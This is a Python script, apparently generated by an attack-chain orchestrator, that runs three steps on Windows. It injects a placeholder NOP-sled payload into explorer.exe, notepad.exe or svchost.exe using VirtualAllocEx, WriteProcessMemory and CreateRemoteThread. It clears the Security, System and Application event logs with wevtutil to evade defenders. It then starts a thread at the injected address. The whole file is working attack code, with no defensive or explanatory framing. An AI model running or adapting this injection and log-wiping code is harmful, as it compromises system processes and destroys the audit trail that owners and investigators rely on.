#!/usr/bin/env python3
import sys
import json
import time
import ctypes
import psutil
import subprocess
from ctypes import wintypes
from typing import Dict, Any

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

# Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
VirtualAllocEx = kernel32.VirtualAllocEx
WriteProcessMemory = kernel32.WriteProcessMemory
CreateRemoteThread = kernel32.CreateRemoteThread

def find_target_process() -> int:
    """Find a target process to inject into."""
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
            return proc.pid
    return None

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'memory_address': None, 'size': None}
    
    try:
        # Find target process
        target_pid = find_target_process()
        if target_pid is None:
            target_pid = psutil.Process().pid  # Fallback to current process
            injection_success = False
        else:
            injection_success = True

        # Open the target process
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            raise Exception("Failed to open process")

        # Allocate memory in the target process
        payload_size = 1024  # Example size, adjust as needed
        remote_addr = VirtualAllocEx(process_handle, None, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if not remote_addr:
            raise Exception("Failed to allocate memory")

        # Write payload to allocated memory
        payload = b'\x90' * payload_size  # NOP sled as example payload
        bytes_written = wintypes.SIZE_T()
        if not WriteProcessMemory(process_handle, remote_addr, payload, payload_size, ctypes.byref(bytes_written)):
            raise Exception("Failed to write process memory")

        # Create a remote thread to execute the payload
        if not CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, None):
            raise Exception("Failed to create remote thread")

        # Populate result
        result['memory_address'] = remote_addr
        result['size'] = payload_size

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract input data
        memory_address = input_data.get('memory_address')
        size = input_data.get('size')

        # Find target process: explorer.exe → notepad.exe → svchost.exe
        target_pid = None
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.pid
                break

        # Fallback to current process if no target found
        if target_pid is None:
            target_pid = ctypes.windll.kernel32.GetCurrentProcessId()
            injection_success = False
        else:
            injection_success = True

        # Open the target process
        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_process:
            raise Exception("Failed to open target process")

        # Create a remote thread in the target process
        thread_id = wintypes.DWORD()
        h_thread = ctypes.windll.kernel32.CreateRemoteThread(
            h_process,
            None,
            0,
            memory_address,
            None,
            0,
            ctypes.byref(thread_id)
        )

        if not h_thread:
            raise Exception("Failed to create remote thread")

        # Close handles
        ctypes.windll.kernel32.CloseHandle(h_thread)
        ctypes.windll.kernel32.CloseHandle(h_process)

        result = {
            'pid': target_pid,
            'running': injection_success
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}
    except Exception as e:
        result = {
            'pid': target_pid if 'target_pid' in locals() else None,
            'running': False
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {
        'security_log_cleared': False,
        'system_log_cleared': False,
        'application_log_cleared': False
    }
    
    try:
        # Clear Security Log
        try:
            subprocess.run(['wevtutil', 'cl', 'Security'], capture_output=True, timeout=10, check=True)
            result['security_log_cleared'] = True
        except subprocess.CalledProcessError:
            pass  # Log clearing failed, continue to next

        # Clear System Log
        try:
            subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True, timeout=10, check=True)
            result['system_log_cleared'] = True
        except subprocess.CalledProcessError:
            pass  # Log clearing failed, continue to next

        # Clear Application Log
        try:
            subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True, timeout=10, check=True)
            result['application_log_cleared'] = True
        except subprocess.CalledProcessError:
            pass  # Log clearing failed, continue to next

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Load PE Payload [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Load PE Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Load PE Payload): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T3: Clear Windows Event Logs [defense-evasion] ──
    try:
        r = task_T3(None)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Clear Windows Event Logs): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Clear Windows Event Logs): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T2: Execute PE Payload [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Execute PE Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Execute PE Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))